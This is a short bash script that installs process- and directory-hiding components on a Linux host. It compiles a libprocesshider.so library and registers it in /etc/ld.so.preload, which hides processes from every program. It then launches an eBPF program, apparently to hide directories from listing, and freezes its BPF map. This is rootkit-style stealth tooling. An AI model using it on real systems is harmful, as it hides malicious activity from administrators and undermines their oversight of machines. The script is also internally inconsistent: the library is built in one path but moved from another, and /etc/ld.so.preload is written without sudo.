#!/bin/bash

make

gcc -Wall -fPIC -shared -o src/processhiding/libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload


sudo ./src/eBPF_ls config.yaml &

sudo bpftool map freeze name directories
